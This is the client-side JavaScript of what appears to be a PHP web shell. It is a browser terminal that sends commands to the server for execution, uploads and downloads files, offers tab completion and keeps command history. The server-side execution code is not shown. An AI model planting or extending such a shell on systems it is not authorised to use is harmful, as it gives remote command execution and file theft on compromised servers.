async function featureHint() {
    const currentVal = input.value.trim();
    if (!currentVal) return;

    const parts = currentVal.split(" ");
    const type = (parts.length === 1) ? "cmd" : "file";
    const filename = (type === "cmd") ? parts[0] : parts[parts.length - 1];

    try {
        const formData = new FormData();
        formData.append('filename', filename);
        formData.append('cwd', currentCwd);
        formData.append('type', type);

        const res = await fetch('?ajax=hint', {
            method: 'POST',
            body: formData
        });
        const data = await res.json();

        if (data.files && data.files.length > 0) {
            if (data.files.length === 1) {
                if (type === 'cmd') {
                    input.value = data.files[0];
                } else {
                    parts[parts.length - 1] = data.files[0];
                    input.value = parts.join(" ");
                }
            } else {
                const hintDiv = document.createElement('div');
                hintDiv.style.color = 'var(--gray)';
                hintDiv.textContent = data.files.join("  ");
                output.appendChild(hintDiv);
                output.scrollTop = output.scrollHeight;
            }
        }
    } catch (e) {}
}

function featureDownload(name, fileBase64) {
    const element = document.createElement('a');
    element.setAttribute('href', 'data:application/octet-stream;base64,' + fileBase64);
    element.setAttribute('download', name);
    element.style.display = 'none';
    document.body.appendChild(element);
    element.click();
    document.body.removeChild(element);
    
    const resDiv = document.createElement('div');
    resDiv.textContent = 'Download started: ' + name;
    output.appendChild(resDiv);
}

function featureUpload(path) {
    const element = document.createElement('input');
    element.setAttribute('type', 'file');
    element.style.display = 'none';
    document.body.appendChild(element);
    
    element.addEventListener('change', async function () {
        if (!element.files[0]) return;
        
        const fileBase64 = await new Promise((resolve, reject) => {
            const reader = new FileReader();
            reader.onload = () => resolve(reader.result.split(',')[1]);
            reader.onerror = reject;
            reader.readAsDataURL(element.files[0]);
        });

        // Resolve absolute path if necessary
        let uploadPath = path;
        if (!uploadPath.startsWith('/')) {
            const separator = currentCwd.endsWith('/') ? '' : '/';
            uploadPath = currentCwd + separator + uploadPath;
        }

        const formData = new FormData();
        formData.append('path', uploadPath);
        formData.append('file', fileBase64);
        formData.append('cwd', currentCwd);

        try {
            const res = await fetch('?ajax=upload', {
                method: 'POST',
                body: formData
            });
            const data = await res.json();
            
            const resDiv = document.createElement('div');
            resDiv.textContent = data.output || data.error || 'Upload failed';
            output.appendChild(resDiv);
            output.scrollTop = output.scrollHeight;
        } catch (e) {
            const errDiv = document.createElement('div');
            errDiv.className = 'error';
            errDiv.textContent = 'Upload error: ' + e.message;
            output.appendChild(errDiv);
        }
    });
    
    element.click();
    document.body.removeChild(element);
}

async function executeCommand(cmd) {

    const echoDiv = document.createElement('div');

    echoDiv.className = 'echo';

    echoDiv.innerHTML = getPromptHTML() + ' ' + cmd;

    output.appendChild(echoDiv);

    const isUpload = /^\s*upload\s+([^\s]+)\s*$/.test(cmd);
    const uploadPath = isUpload ? cmd.match(/^\s*upload\s+([^\s]+)\s*$/)[1] : null;

    const loadingDiv = document.createElement('div');

    loadingDiv.className = 'loading';
    loadingDiv.textContent = '[Processing...]';

    output.appendChild(loadingDiv);

    output.scrollTop = output.scrollHeight;

    try {

        const formData = new FormData();
        formData.append('cmd', cmd);
        formData.append('cwd', currentCwd);

        const response = await fetch('?ajax=execute', {
            method: 'POST',
            body: formData
        });

        const data = await response.json();

        loadingDiv.remove();

        const resDiv = document.createElement('div');
        resDiv.textContent = data.output;
        output.appendChild(resDiv);

        if (data.file) {
            featureDownload(data.name, data.file);
        }

        if (data.cwd) {
            currentCwd = data.cwd;
            updatePromptDOM();
        }

        history = data.history || [];
        historyIndex = history.length;

        if (isUpload) {
            featureUpload(uploadPath);
        }

    } catch(err) {

        loadingDiv.remove();

        const errDiv = document.createElement('div');

        errDiv.className = 'error';
        errDiv.textContent = err.message;

        output.appendChild(errDiv);
    }

    output.scrollTop = output.scrollHeight;
}

input.addEventListener('keydown', (e) => {

    if (e.key === 'Enter') {

        const cmd = input.value.trim();

        input.value = '';

        if (!cmd) return;

        if (cmd === 'clear') {

            output.innerHTML = '';
            showBanner();

            return;
        }

        if (cmd === 'exit') {

            window.location.href = '?logout=1';
            return;
        }

        executeCommand(cmd);
    }

    if (e.key === 'Tab') {
        e.preventDefault();
        featureHint();
    }

    if (e.key === 'ArrowUp') {

        e.preventDefault();

        if (historyIndex > 0) {

            historyIndex--;

            input.value = history[historyIndex];
        }
    }

    if (e.key === 'ArrowDown') {

        e.preventDefault();

        if (historyIndex < history.length - 1) {

            historyIndex++;

            input.value = history[historyIndex];

        } else {

            historyIndex = history.length;
            input.value = '';
        }
    }
});

document.addEventListener('click', () => input.focus());

window.onload = () => {
    const intro = document.getElementById('intro-container');
    const term = document.getElementById('terminal');

    if (playIntroFlag) {
        playIntroAnimation(() => {
            showBanner();
            input.focus();
        });
    } else {
        intro.style.display = 'none';
        term.style.display = 'flex';
        // Force reflow and fade in
        void term.offsetWidth;
        term.style.opacity = '1';
        updatePromptDOM();
        showBanner();
        input.focus();
    }
};

</script>

<?php endif; ?>

